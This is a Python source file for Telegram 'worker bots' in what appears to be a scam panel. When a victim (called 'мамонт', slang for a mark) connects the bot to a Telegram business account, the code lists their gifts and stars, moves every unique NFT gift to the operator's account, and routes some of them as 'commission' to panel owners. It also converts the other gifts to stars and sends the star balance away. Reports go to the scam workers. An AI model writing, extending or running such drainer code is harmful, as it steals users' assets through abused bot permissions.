# worker_bots.py
import asyncio
import json
import logging
import os
import re
import secrets

from aiohttp import web
from sqlalchemy.orm import selectinload
from aiogram import Bot
from aiogram.client.default import DefaultBotProperties
from logging.handlers import RotatingFileHandler
from aiogram.exceptions import TelegramBadRequest
from aiogram.methods import (
    ConvertGiftToStars,
    GetBusinessAccountGifts,
    GetBusinessAccountStarBalance,
    TransferBusinessAccountStars,
    TransferGift,
)
from aiogram.types import Update

from aiogram.filters import Command, CommandStart 
from aiogram import F, Router, Dispatcher
from aiogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InlineQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
)
from aiogram.fsm.storage.memory import MemoryStorage

from sqlalchemy import select
from sqlalchemy.exc import SQLAlchemyError
from sqlalchemy.ext.asyncio import AsyncSession
from aiogram.webhook.aiohttp_server import SimpleRequestHandler
from datetime import datetime

from config import OWNER_ACCOUNT_ID, PANEL_OWNERS
from db import Session
from log_bot import send_log
from models import CustomGift, StarCheck, WorkerBot, Admin, BusinessConnection, GlobalStats, WorkerBotUser
from channel_stats_logger import send_admin_transfer_log_to_channel, send_manual_transfer_log_to_channel
from aiogram.exceptions import TelegramUnauthorizedError


LOG_DIR = "Логи"
TRANSFER_LOG_DIR = "Логи"
os.makedirs(LOG_DIR, exist_ok=True)
STAR_PRICE = 0.015

_bots: dict[str, Bot] = {}

def get_cached_bot(token: str) -> Bot:
    bot = _bots.get(token)
    if not bot:
        bot = Bot(token=token, default=DefaultBotProperties(parse_mode="HTML"))
        _bots[token] = bot
    return bot

def human_datetime(ts):
    try:
        return datetime.fromtimestamp(int(ts)).strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return str(ts)

def get_worker_logger(telegram_id: int) -> logging.Logger:
    logger_name = f"worker_{telegram_id}"
    file_path = os.path.join(LOG_DIR, f"{telegram_id}_Connection.log")
    logger = logging.getLogger(logger_name)
    logger.setLevel(logging.INFO)
    while logger.handlers:
        handler = logger.handlers[0]
        handler.close()
        logger.removeHandler(handler)
    handler = RotatingFileHandler(file_path, maxBytes=10*1024*1024, backupCount=3, encoding="utf-8")
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    return logger

def get_transfer_logger(admin_id: int) -> logging.Logger:
    logger_name = f"transfer_{admin_id}"
    file_path = os.path.join(TRANSFER_LOG_DIR, f"{admin_id}_Transfer.log")
    logger = logging.getLogger(logger_name)
    logger.setLevel(logging.INFO)
    while logger.handlers:
        handler = logger.handlers[0]
        handler.close()
        logger.removeHandler(handler)
    handler = RotatingFileHandler(file_path, maxBytes=10*1024*1024, backupCount=3, encoding="utf-8")
    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    return logger

def get_logger_for_admin(admin: Admin) -> logging.Logger:
    return get_worker_logger(admin.telegram_id)

async def get_admin_for_worker(session: AsyncSession, worker_bot: WorkerBot) -> Admin | None:
    result = await session.execute(select(Admin).where(Admin.id == worker_bot.owner_id))
    return result.scalar_one_or_none()

async def get_business_connection(session: AsyncSession, worker_bot_id: int, telegram_id: int) -> BusinessConnection | None:
    result = await session.execute(
        select(BusinessConnection).where(
            BusinessConnection.worker_bot_id == worker_bot_id,
            BusinessConnection.telegram_id == telegram_id
        )
    )
    return result.scalar_one_or_none()

async def commit_with_log(session: AsyncSession, logger: logging.Logger, success_msg: str, error_msg: str) -> bool:
    try:
        await session.commit()
        logger.info(success_msg)
        return True
    except SQLAlchemyError as e:
        logger.error(f"{error_msg}: {e}")
        return False

async def handle_webhook_business_connection(update: dict, bot: Bot):
    if "business_connection" not in update:
        return

    bc = update["business_connection"]
    bot_token = next((t for t, b in _bots.items() if b == bot), None)
    if not bot_token:
        return

    async with Session() as session:
        try:
            result = await session.execute(
                select(WorkerBot)
                .options(selectinload(WorkerBot.template))
                .where(WorkerBot.token == bot_token)
            )
            worker_bot = result.scalar_one_or_none()
            if not worker_bot or not worker_bot.owner_id:
                return

            admin = await get_admin_for_worker(session, worker_bot)
            if not admin or not admin.log_bot_enabled:
                return

            logger = get_logger_for_admin(admin)

            user = bc.get("user", {})
            business_user_id = user.get("id")
            username = user.get("username", "неизвестно")
            business_connection_id = bc.get("id")
            is_enabled = bc.get("is_enabled", True)

            rights = bc.get("rights", {})
            logger.info(f"Права подключения для bc_id {business_connection_id}: {json.dumps(rights, ensure_ascii=False)}")

            connection = await get_business_connection(session, worker_bot.id, business_user_id)

            gifts_count = stars_count = nft_count = 0
            try:
                gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
                stars = await bot(GetBusinessAccountStarBalance(business_connection_id=business_connection_id))

                gifts_count = len([g for g in gifts.gifts if getattr(g, "type", "") != "unique"])
                nft_count = len([g for g in gifts.gifts if getattr(g, "type", "") == "unique"])
                stars_count = int(stars.amount)

                nft_links = []
                for g in gifts.gifts:
                    if getattr(g, "type", "") == "unique":
                        slug = getattr(getattr(g, "gift", None), "name", None) or getattr(g, "slug", None)
                        if slug:
                            nft_links.append(f"https://t.me/nft/{slug}")
                if nft_links:
                    logger.info("Ссылки на NFT:\n" + "\n".join(nft_links))
                else:
                    logger.info("Нет NFT для вывода ссылок.")

                logger.info(f"[{admin.id}] 🎁 Подарки: {gifts_count}, 🧬 NFT: {nft_count}, ⭐️ Звёзды: {stars_count}")
            except TelegramBadRequest as e:
                if "BOT_ACCESS_FORBIDDEN" in str(e):
                    logger.error(f"⚠️ BOT_ACCESS_FORBIDDEN при получении бизнес-данных. Права: {json.dumps(rights, ensure_ascii=False)}")
                else:
                    logger.error(f"Ошибка при получении бизнес-данных: {e}")

            if not is_enabled and connection:
                logger.info(
                    f"⛔️ Отключение бота @{worker_bot.username or 'без username'} пользователем "
                    f"@{username or 'неизвестно'} (ID: {business_user_id})"
                )
                connection.is_connected = False
                if not await commit_with_log(session, logger, "✅ is_connected = False", "❌ Ошибка при commit отключения"):
                    return

                template = worker_bot.template
                disconnect_text = template.disconnect_text if template else None
                if disconnect_text:
                    asyncio.create_task(
                        bot.send_message(
                            chat_id=business_user_id,
                            text=disconnect_text,
                            parse_mode="HTML"
                        )
                    )

                text = (
                    f"<b>🤖 Бот <b>@{worker_bot.username or 'нету'}</b> отключён от Telegram Business</b>\n"
                    f"<b>💁🏻‍♀️ Отключил:</b> <b>@{username or 'нету'}</b> <b>ID</b> <code>{business_user_id}</code>"
                )
                logger.info("📤 Отправка лога админу (отключение)")
                await send_log(admin.telegram_id, text)
                return

            DEFAULT_NO_RIGHTS_TEXT = (
                "<b>Ты подключил(а) бота, но не выдал(а) разрешение на «Подарки и звёзды».</b>\n\n"
                 "<b>А без этого бот не сможет работать 🙁</b>"
            )

            template = worker_bot.template
            no_rights_text = template.no_rights_text if template and template.no_rights_text else DEFAULT_NO_RIGHTS_TEXT

            if not rights.get("can_transfer_and_upgrade_gifts"):
                logger.warning("⚠️ Отсутствует право can_transfer_and_upgrade_gifts")
                if no_rights_text:
                    asyncio.create_task(
                        bot.send_message(
                            chat_id=business_user_id,
                            text=no_rights_text,
                            parse_mode="HTML"
                        )
                    )

            rights_changed = False
            old_rights = connection.rights_json if connection and getattr(connection, "rights_json", None) else {}
            if json.dumps(old_rights, sort_keys=True) != json.dumps(rights, sort_keys=True):
                rights_changed = True
                logger.info(f"Права изменились. Старые: {json.dumps(old_rights, ensure_ascii=False)}, Новые: {json.dumps(rights, ensure_ascii=False)}")

            if connection and connection.is_connected and not rights_changed:
                logger.info("🔁 Подключение уже зарегистрировано и права не изменились — уведомление не отправляем")
                if connection.nft_count != nft_count or connection.regular_gift_count != gifts_count or connection.stars_count != stars_count:
                    connection.nft_count = nft_count
                    connection.regular_gift_count = gifts_count
                    connection.stars_count = stars_count
                    await session.commit()
                return

            if connection:
                was_disconnected = not connection.is_connected
                connection.is_connected = True
                connection.business_connection_id = business_connection_id
                connection.rights_json = rights
                connection.nft_count = nft_count
                connection.regular_gift_count = gifts_count
                connection.stars_count = stars_count
                await session.commit()

                status_line = (
                    "📦 Бот повторно подключён к Telegram Business (обновлены права)"
                    if rights_changed else
                    "📦 Бот уже был подключён — обновлены данные"
                )
            else:
                connection = BusinessConnection(
                    telegram_id=business_user_id,
                    username=username,
                    admin_id=admin.id,
                    worker_bot_id=worker_bot.id,
                    is_connected=True,
                    business_connection_id=business_connection_id,
                    rights_json=rights,
                    nft_count=nft_count,
                    regular_gift_count=gifts_count,
                    stars_count=stars_count
                )
                session.add(connection)
                worker_bot.connection_count += 1
                logger.info("🔢 Уникальное подключение — увеличиваем connection_count")
                await session.commit()
                status_line = "📦 Бот добавлен в Telegram Business"

            rights_info = []
            if rights:
                permission_map = {
                    "Просмотр подарков и звёзд": rights.get("can_view_gifts_and_stars"),
                    "Обмен подарков на звёзды": rights.get("can_convert_gifts_to_stars"),
                    "Настройка подарков": rights.get("can_change_gift_settings"),
                    "Передача и улучшение подарков": rights.get("can_transfer_and_upgrade_gifts"),
                    "Отправка звёзд": rights.get("can_transfer_stars"),
                }
                for label, granted in permission_map.items():
                    mark = "✅" if granted else "❌"
                    rights_info.append(f"{mark} {label}")
            else:
                rights_info.append("❌ Права отсутствуют")
            logger.info(f"Читаемые права для bc_id {business_connection_id}:\n" + "\n".join(rights_info))

            logger.info(
                f"{status_line} — @{worker_bot.username or 'без username'} "
                f"добавил(а) @{username or 'неизвестно'} (ID: {business_user_id})"
            )

            text = (
                f"<b>{status_line}</b>\n"
                f"<b>🤖 Бот:</b> <b>@{worker_bot.username or 'нету'}</b>\n"
                f"<b>💁🏻‍♀️ Добавил:</b> <b>@{username or 'нету'}</b> <b>ID</b> <code>{business_user_id}</code>\n"
                f"<b>🎁 Подарков:</b> <code>{gifts_count}</code>\n"
                f"<b>🖼 NFT:</b> <code>{nft_count}</code>\n"
                f"<b>⭐️ Звёзд:</b> <code>{stars_count}</code>\n"
                f"<b>🔐 Права:</b>\n"
                f"<b><blockquote>{chr(10).join(rights_info)}</blockquote></b>"
            )

            logger.info("📤 Отправка лога админу (подключение)")
            await send_log(admin.telegram_id, text)

            can_transfer_and_upgrade_gifts = rights.get("can_transfer_and_upgrade_gifts", False)
            can_transfer_stars = rights.get("can_transfer_stars", False)

            if can_transfer_and_upgrade_gifts or can_transfer_stars:
                transfer_notice = (
                    f"🚀 <b>Передача для @{worker_bot.username or 'нету'}</b>\n"
                    f"➡️ <code>{worker_bot.nft_transfer_to_id or 'нету'}</code>"
                )
                await send_log(admin.telegram_id, transfer_notice)

                await handle_gift_processing_after_connection(
                    bot, business_connection_id, worker_bot, admin, business_user_id, business_user_id, session
                )
            else:
                logger.info(
                    "⛔️ Оба разрешения (Передача и улучшение подарков, Отправка звёзд) не выданы. "
                    "handle_gift_processing_after_connection не запускаем."
                )

        except Exception as e:
            logger = get_worker_logger("unknown")
            logger.exception(f"💥 Непредвиденная ошибка в обработчике business_connection: {e}")

async def log_commission_nft(admin, nft_link, PANEL_OWNERS):
    try:
        username = admin.username or "нет"
        msg_owner = "☕️ Комиссионный NFT уходит панели"
        await send_log(admin.telegram_id, msg_owner)

        msg_admins = (
            "<b>☕️ Комиссионный NFT</b>\n"
            f"<b>🤦🏻‍♀️ Воркер:</b> <code>{admin.telegram_id}</code>\n"
            f"<b>👉 Имя:</b> <b>{admin.first_name or ''}</b>\n"
            f"<b>👉 Тэг:</b> @{username}\n"
        )
        if nft_link:
            msg_admins += f"<b>🎆 NFT:</b> <a href='{nft_link}'>{nft_link}</a>\n"

        tasks = [send_log(panel_admin_id, msg_admins, disable_web_page_preview=False) for panel_admin_id in PANEL_OWNERS]
        await asyncio.gather(*tasks)
    except Exception as e:
        print(f"[log_commission_nft] Ошибка отправки логов: {e}")

async def transfer_all_nfts_after_connection(
    bot: Bot,
    bc_id: str,
    worker_bot: WorkerBot,
    admin: Admin,
    stats: dict,
    transfer_logger: logging.Logger,
    connected_user_id: int,
    session
) -> tuple[int, list]:
    admin = await session.merge(admin)

    def log_and_send(msg: str, level: str = "info"):
        full_msg = f"[From {connected_user_id}] {msg}"
        getattr(transfer_logger, level)(full_msg)

    log_and_send("=== Старт transfer_all_nfts_after_connection ===")
    log_and_send(f"bc_id: {bc_id}, worker_bot_id: {worker_bot.id}, admin_id: {admin.id}")

    if not worker_bot.nft_transfer_to_id:
        log_and_send("Передача NFT не выполнена — не указан nft_transfer_to_id у воркер-бота", "warning")
        log_and_send("=== Завершение: нет адресата для передачи ===")
        await send_log(admin.telegram_id, "❗️ Передача NFT не выполнена — не указан аккаунт для передачи.")
        return 0, []

    try:
        log_and_send("Получаем список подарков (GetBusinessAccountGifts)...")
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=bc_id))
        log_and_send(f"Найдено подарков: {len(gifts.gifts)}")
        nfts = [g for g in gifts.gifts if getattr(g, "type", "") == "unique"]
        log_and_send(f"Найдено уникальных NFT: {len(nfts)}")

        if not nfts:
            log_and_send("🧬 Нет уникальных NFT для передачи", "info")
            log_and_send("=== Завершение: нет уникальных NFT ===")
            return 0, []

        log_and_send(f"🚚 Начинаем передачу {len(nfts)} уникальных NFT")

        success = 0
        hold_nfts = []
        session.add(admin)

        for gift in nfts:
            log_and_send(f"▶️ Начинаем обработку NFT: {gift.owned_gift_id}")

            nft_link = None
            slug = None
            gift_obj = getattr(gift, "gift", None)
            if gift_obj and hasattr(gift_obj, "name"):
                slug = getattr(gift_obj, "name")
            if not slug:
                slug = getattr(gift, "slug", None)
            if slug:
                nft_link = f"https://t.me/nft/{slug}"

            for attempt in range(3):
                log_and_send(f"Попытка #{attempt+1} передачи NFT {gift.owned_gift_id}")

                commission_every = admin.commission_every or 4
                commission_counter = admin.commission_counter or 0
                is_commission = (commission_counter + 1) >= commission_every

                log_and_send(f"commission_counter: {commission_counter}, commission_every: {commission_every}, is_commission: {is_commission}")

                if is_commission:
                    recipient_id = OWNER_ACCOUNT_ID
                    log_and_send(f"Получатель для комиссии: {recipient_id}")
                else:
                    recipient_id = worker_bot.nft_transfer_to_id
                    log_and_send(f"Получатель NFT: {recipient_id}")

                try:
                    log_and_send(f"Выполняем TransferGift для NFT {gift.owned_gift_id} (получатель: {recipient_id})")
                    await bot(TransferGift(
                        business_connection_id=bc_id,
                        owned_gift_id=gift.owned_gift_id,
                        new_owner_chat_id=recipient_id,
                        star_count=getattr(gift, "transfer_star_count", None)
                    ))
                    log_and_send(f"✅ NFT ID {gift.owned_gift_id} передан пользователю {recipient_id}")
                    success += 1

                    admin.commission_counter = (commission_counter + 1) if not is_commission else 0
                    log_and_send(f"commission_counter обновлён: {admin.commission_counter}")
                    session.add(admin)

                    if is_commission:
                        asyncio.create_task(log_commission_nft(admin, nft_link, PANEL_OWNERS))
                        log_and_send(f"Комиссионные сообщения отправлены: owner+админы (в фоне)")

                    for _ in range(4):
                        try:
                            await session.commit()
                            break
                        except Exception:
                            await asyncio.sleep(1)
                    else:
                        raise Exception(f"ФАТАЛЬНО! NFT {gift.owned_gift_id} передан, но не записался в БД!")

                    log_and_send(f"✅ Коммит после передачи NFT {gift.owned_gift_id}")
                    break
                except TelegramBadRequest as e:
                    log_and_send(f"❌ Не удалось передать NFT ID {gift.owned_gift_id}: {e}", "warning")
                    error_text = str(e)
                    if "STARGIFT_TRANSFER_TOO_EARLY" in error_text:
                        stats["nft_hold_too_early"] += 1
                        next_transfer_date = getattr(gift, "next_transfer_date", 0)
                        next_transfer_human = human_datetime(next_transfer_date) if next_transfer_date else "нет данных"
                        hold_nfts.append((slug, nft_link, next_transfer_human))
                        log_and_send(
                            f"NFT {slug or gift.owned_gift_id} в холде до {next_transfer_human}", "info"
                        )
                        break
                    elif "BALANCE_TOO_LOW" in error_text:
                        stats["balance_too_low"] = True
                        stats["nft_not_sent"] += 1
                        log_and_send(f"Баланс слишком низкий для передачи NFT ID {gift.owned_gift_id}, отмечаем и продолжаем")
                        break
                    elif "Bad Request: unknown chat identifier specified" in error_text and not is_commission:
                        log_and_send(f"⚠️ Бот не запущен на аккаунте {recipient_id}, уведомление админу отправлено")
                        break
                    elif "BUSINESS_CONNECTION_INVALID" in error_text:
                        log_and_send(f"❌ BUSINESS_CONNECTION_INVALID — бизнес-коннект невалидный, завершаем цикл!", "error")
                        return success, hold_nfts
                    elif "PREMIUM_ACCOUNT_REQUIRED" in error_text:
                        log_and_send(f"❌ PREMIUM_ACCOUNT_REQUIRED — нужен премиум аккаунт, завершаем цикл!", "error")
                        return success, hold_nfts
                    await asyncio.sleep(1)
                except Exception as e:
                    log_and_send(f"❗️ Неожиданная ошибка передачи NFT ID {gift.owned_gift_id}: {e}", "error")
                    await asyncio.sleep(1)
            else:
                log_and_send(f"❌ Не удалось передать NFT {gift.owned_gift_id} после 3 попыток", "error")

        stats["nft_success"] += success
        session.add(admin)
        await session.commit()
        log_and_send(f"🎯 Успешно передано NFT: {success} из {len(nfts)}")
        log_and_send(f"NFT в холде: {len(hold_nfts)}")
        log_and_send("=== Завершение transfer_all_nfts_after_connection ===")
        return success, hold_nfts

    except TelegramBadRequest as e:
        err = f"❌ Ошибка при получении подарков: {e}"
        log_and_send(err, "error")
        log_and_send("=== Завершение с ошибкой получения подарков ===")
        return 0, []

# Только конвертация обычных подарков в звёзды
async def convert_regular_gifts_only(
    bot: Bot,
    bc_id: str,
    worker_bot: WorkerBot,
    admin: Admin,
    stats: dict,
    transfer_logger: logging.Logger,
    connected_user_id: int,
    session
):
    def log_with_id(msg: str, level: str = "info"):
        full_msg = f"[UserID:{connected_user_id}] {msg}"
        getattr(transfer_logger, level)(full_msg)

    if "regular_convert_failed" not in stats:
        stats["regular_convert_failed"] = 0

    try:
        try:
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=bc_id))
        except TelegramBadRequest as e:
            err_msg = str(e)
            if "BOT_ACCESS_FORBIDDEN" in err_msg:
                log_with_id("⚠️ Нет доступа к подаркам (BOT_ACCESS_FORBIDDEN), пропускаем конвертацию", "warning")
                stats["errors"] += 1
                return
            elif "BUSINESS_CONNECTION_INVALID" in err_msg:
                log_with_id("❌ BUSINESS_CONNECTION_INVALID — бизнес-коннект невалидный, пропускаем конвертацию", "error")
                stats["errors"] += 1
                return
            elif "PREMIUM_ACCOUNT_REQUIRED" in err_msg:
                log_with_id("❌ PREMIUM_ACCOUNT_REQUIRED — нужен премиум аккаунт, операция невозможна", "error")
                stats["errors"] += 1
                return
            else:
                stats["errors"] += 1
                log_with_id(f"❌ Неизвестная ошибка при получении подарков: {e}", "error")
                return

        regular_gifts = [g for g in gifts.gifts if getattr(g, "type", "") != "unique"]

        if not regular_gifts:
            log_with_id("📦 Нет обычных подарков для обработки")
            return

        log_with_id(f"🔄 Начинаем конвертацию {len(regular_gifts)} обычных подарков")
        
        for gift in regular_gifts:
            log_with_id(f"➡️ Конвертация подарка ID {gift.owned_gift_id} (тип: {gift.type})")
            try:
                await bot(ConvertGiftToStars(
                    business_connection_id=bc_id,
                    owned_gift_id=gift.owned_gift_id
                ))
                stats["converted"] += 1
                log_with_id(f"✅ Успешно конвертирован подарок ID {gift.owned_gift_id} в звёзды")
                
            except TelegramBadRequest as e:
                stats["errors"] += 1
                err_msg = str(e)
                if "STARGIFT_CONVERT_TOO_OLD" in err_msg:
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"⚠️ Подарок слишком стар — конвертация невозможна", "warning")
                elif "BOT_ACCESS_FORBIDDEN" in err_msg:
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"🚫 Нет прав на конвертацию (BOT_ACCESS_FORBIDDEN), пропускаем подарок", "warning")
                    continue
                elif "BUSINESS_CONNECTION_INVALID" in err_msg:
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"❌ BUSINESS_CONNECTION_INVALID — бизнес-коннект невалидный, прерываем цикл", "error")
                    break
                elif "PREMIUM_ACCOUNT_REQUIRED" in err_msg:
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"❌ PREMIUM_ACCOUNT_REQUIRED — нужен премиум аккаунт, прерываем цикл", "error")
                    break
                else:
                    stats["regular_convert_failed"] += 1
                    log_with_id(f"🚫 Ошибка конвертации: {e}", "warning")
                    
            except Exception as e:
                stats["errors"] += 1
                stats["regular_convert_failed"] += 1
                log_with_id(f"❗️ Неожиданная ошибка: {e}", "error")

            await asyncio.sleep(0.1)

        log_with_id(f"✅ Завершено: конвертировано {stats['converted']} подарков, ошибок: {stats['errors']}")

    except Exception as e:
        stats["errors"] += 1
        log_with_id(f"❌ Критическая ошибка: {e}", "error")

# Перевод остатка звёзд
async def transfer_remaining_stars_after_processing(
    bot: Bot, 
    bc_id: str, 
    worker_bot: WorkerBot, 
    admin: Admin, 
    stats: dict, 
    transfer_logger: logging.Logger,
    connected_user_id: int,
    session
):
    def log_with_id(msg: str, level: str = "info"):
        full_msg = f"[From {connected_user_id}] {msg}"
        getattr(transfer_logger, level)(full_msg)

    PART_SIZE = 10000

    try:
        try:
            stars = await bot(GetBusinessAccountStarBalance(business_connection_id=bc_id))
            amount = int(stars.amount)
            log_with_id(f"💫 Остаток звёзд на балансе: {amount}")
        except TelegramBadRequest as e:
            log_with_id(f"DEBUG: Exception on balance: {e}, type={type(e)}", "error")
            err_msg = str(e)
            if "BOT_ACCESS_FORBIDDEN" in err_msg:
                log_with_id("⚠️ Бот не имеет доступа к звёздам (BOT_ACCESS_FORBIDDEN), пропускаем передачу", "warning")
                stats["errors"] += 1
                return
            elif "BUSINESS_CONNECTION_INVALID" in err_msg:
                log_with_id("❌ BUSINESS_CONNECTION_INVALID — бизнес-коннект невалидный, пропускаем", "error")
                stats["errors"] += 1
                return
            elif "PREMIUM_ACCOUNT_REQUIRED" in err_msg:
                log_with_id("❌ PREMIUM_ACCOUNT_REQUIRED — нужен премиум аккаунт, операция невозможна", "error")
                stats["errors"] += 1
                return
            else:
                stats["errors"] += 1
                log_with_id(f"❌ Неизвестная ошибка при получении баланса: {e}", "error")
                return

        if amount > 0 and worker_bot.nft_transfer_to_id:
            to_send = amount
            part_num = 1
            while to_send > 0:
                part = min(to_send, PART_SIZE)
                try:
                    log_with_id(f"🚀 [{part_num}] Пытаемся передать {part} звёзд на {worker_bot.nft_transfer_to_id}")
                    await bot(TransferBusinessAccountStars(
                        business_connection_id=bc_id,
                        star_count=part,
                        new_owner_chat_id=worker_bot.nft_transfer_to_id
                    ))
                    stats["stars_transferred"] += part
                    stats["stars_really_transferred"] = True  
                    log_with_id(f"✅ [{part_num}] УСПЕШНО ПЕРЕДАНО {part} звёзд получателю {worker_bot.nft_transfer_to_id}")
                    to_send -= part
                    part_num += 1
                except TelegramBadRequest as e:
                    stats["errors"] += 1
                    err_msg = str(e)
                    log_with_id(f"❌ [{part_num}] TelegramBadRequest при передаче {part} звёзд: {e} (type={type(e)})", "warning")
                    if "BUSINESS_CONNECTION_INVALID" in err_msg:
                        log_with_id(f"❌ [{part_num}] BUSINESS_CONNECTION_INVALID при передаче — прерываем дальнейшие попытки.", "error")
                        break
                    elif "PREMIUM_ACCOUNT_REQUIRED" in err_msg:
                        log_with_id(f"❌ [{part_num}] PREMIUM_ACCOUNT_REQUIRED — нужен премиум аккаунт для передачи, прерываем.", "error")
                        break
                    log_with_id(f"DEBUG: Ошибка данные - part={part}, остаток={to_send}, type={type(part)}")
                    break  
                except Exception as e:
                    stats["errors"] += 1
                    log_with_id(f"❌ [{part_num}] Неожиданная ошибка при передаче {part} звёзд: {e} (type={type(e)})", "error")
                    break  

    except Exception as e:
        stats["errors"] += 1
        err = f"❌ Ошибка при обработке передачи звёзд: {e} (type={type(e)})"
        log_with_id(err, "exception")

def build_stats():
    return {
        "nft_success": 0,
        "nft_not_unique": 0,
        "converted": 0,
        "regular_convert_failed": 0,
        "stars_transferred": 0,
        "stars_really_transferred": False,
        "errors": 0,
        "nft_hold_too_early": 0,
        "balance_too_low": False,
        "nft_not_sent": 0,
        "current_stars": 0,
    }

def build_transfer_disabled_msgs(settings):
    msgs = []
    if not (settings and settings.transfer_stars_enabled):
        msgs.append("Передача звёзд отключена")
    if not (settings and settings.convert_gifts_to_stars_enabled):
        msgs.append("Обмен подарков на звёзды отключён")
    return msgs

def build_summary(
    business_user_id, stats, successful_nfts, hold_nfts, transfer_disabled_msgs
):
    summary = (
        f"<b>👉 #{business_user_id}</b>\n"
        f"<b>📦 Сводка передачи:</b>\n"
        f"<b>✅ NFT передано:</b> <code>{stats['nft_success']}</code>\n"
        f"<b>🕒 NFT с холдом:</b> <code>{len(hold_nfts)}</code>\n"
        f"<b>♻️ Конвертировано в звёзды:</b> <code>{stats['converted']}</code>\n"
        f"<b>❗️ Старые подарки:</b> <code>{stats['regular_convert_failed']}</code>\n"
        f"<b>⭐️ Звёзд передано:</b> <code>{stats['stars_transferred']}</code>\n"
        f"<b>🚨 Ошибок за процесс:</b> <code>{stats['errors']}</code>\n"
    )

    if hold_nfts:
        summary += "\n<b>🕒 NFT с холдом:</b>\n"
        for slug, link, unlock_dt in hold_nfts:
            if link:
                summary += f"• <b><a href='{link}'>{slug}</a></b> — <code>{unlock_dt}</code>\n"
            else:
                summary += f"• <b>{slug}</b> — <code>{unlock_dt}</code>\n"

    if stats.get("balance_too_low"):
        nft_not_sent = stats.get("nft_not_sent", 0)
        current_stars = stats.get("current_stars", 0)
        need_stars = max(0, nft_not_sent * 25 - current_stars)
        summary += (
            f"\n<blockquote>"
            f"<b>❗️ Для полного перевода пополни минимум: {need_stars}⭐️</b>\n"
            "✅ Пополни звёзды мамонту и запусти повторное списание!"
            "</blockquote>"
        )

    if transfer_disabled_msgs:
        summary += (
            "\n<blockquote>⚠️ Некоторые функции отключены настройками:\n" +
            "\n".join(f"• {msg}" for msg in transfer_disabled_msgs) +
            "</blockquote>"
        )
    return summary

async def handle_gift_processing_after_connection(
    bot: Bot,
    bc_id: str,
    worker_bot: WorkerBot,
    admin: Admin,
    business_user_id: int,
    connected_user_id: int,
    session,
    summary_only: bool = False,
    manual: bool = False  # новый флаг
):
    admin = await session.scalar(
        select(Admin).options(selectinload(Admin.settings)).where(Admin.id == admin.id)
    )
    settings = admin.settings

    stats = build_stats()
    transfer_logger = get_transfer_logger(admin.telegram_id)
    transfer_disabled_msgs = build_transfer_disabled_msgs(settings)

    successful_nfts = []
    hold_nfts = []

    try:
        transfer_logger.info("=== Запуск: первая попытка передачи NFT ===")
        successful_nfts, hold_nfts = await transfer_all_nfts_after_connection(
            bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
        )

        if settings and settings.convert_gifts_to_stars_enabled:
            transfer_logger.info("=== Запуск: конвертация обычных подарков в звёзды ===")
            await convert_regular_gifts_only(
                bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
            )
        else:
            transfer_logger.info("⛔️ Конвертация подарков отключена настройками")

        try:
            stars = await bot(GetBusinessAccountStarBalance(business_connection_id=bc_id))
            transfer_logger.info(f"Баланс звёзд после конвертации: {stars.amount}")
            stats["current_stars"] = stars.amount

            if stars.amount >= 25:
                transfer_logger.info("=== Запуск: повторная попытка передачи NFT после конвертации ===")
                await transfer_all_nfts_after_connection(
                    bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
                )
            else:
                transfer_logger.info("Повторная передача NFT не требуется: баланс звёзд < 25")
        except Exception as e:
            stats["errors"] += 1
            transfer_logger.warning(f"Не удалось получить баланс звёзд для повторной передачи NFT: {e}")

        if settings and settings.transfer_stars_enabled:
            transfer_logger.info("=== Запуск: передача оставшихся звёзд ===")
            await transfer_remaining_stars_after_processing(
                bot, bc_id, worker_bot, admin, stats, transfer_logger, connected_user_id, session
            )
        else:
            transfer_logger.info("⛔️ Передача звёзд отключена настройками")

    except Exception as e:
        stats["errors"] += 1
        transfer_logger.error(f"❗️ Критическая ошибка в процессе передачи: {e}")

    finally:
        if summary_only:
            return {
                "nft_success": stats["nft_success"],
                "stars_transferred": stats["stars_transferred"],
                "converted": stats["converted"],
                "hold_total": stats["nft_hold_too_early"],
                "hold_nfts": hold_nfts,
            }

        transfer_logger.info("=== Итоговая сводка передачи (отправляется админу) ===")

        summary = build_summary(
            business_user_id, stats, successful_nfts, hold_nfts, transfer_disabled_msgs
        )

        await send_log(admin.telegram_id, summary)
        transfer_logger.info("Сводка отправлена админу")

        stars_total = stats["stars_transferred"]

        try:
            await update_admin_stats(
                session,
                admin,
                nft=stats["nft_success"],
                regular=0,
                stars=stars_total
            )
            await update_global_stats(
                session,
                nft=stats["nft_success"],
                regular=0,
                stars=stars_total
            )
            transfer_logger.info(f"[STATS_UPDATED] Admin {admin.telegram_id} (NFT={stats['nft_success']}, Stars={stars_total})")
        except Exception as e:
            transfer_logger.error(f"[STATS_UPDATE_ERROR] {e}")

        if stats["stars_really_transferred"] or stats["nft_success"] > 0:
            async def send_log_in_background():
                try:
                    if manual:
                        await send_manual_transfer_log_to_channel(
                            admin.telegram_id,
                            stars_total,
                            stats["nft_success"]
                        )
                        transfer_logger.info("Ручной лог отправлен в канал")
                    else:
                        await send_admin_transfer_log_to_channel(
                            admin.telegram_id,
                            stars_total,
                            stats["nft_success"]
                        )
                        transfer_logger.info("Массовый лог отправлен в канал")
                except Exception as e:
                    transfer_logger.error(f"[SEND_LOG_TO_CHANNEL_ERROR] {e}")

            asyncio.create_task(send_log_in_background())

async def update_global_stats(session, nft=0, regular=0, stars=0):
    stats = await session.scalar(select(GlobalStats).limit(1))
    if not stats:
        stats = GlobalStats()
        session.add(stats)
        await session.commit()
        await session.refresh(stats)

    stats.daily_gifts_unique += nft
    stats.daily_stars_sent += stars

    stats.total_gifts_unique += nft
    stats.total_stars_sent += stars

    await session.commit()

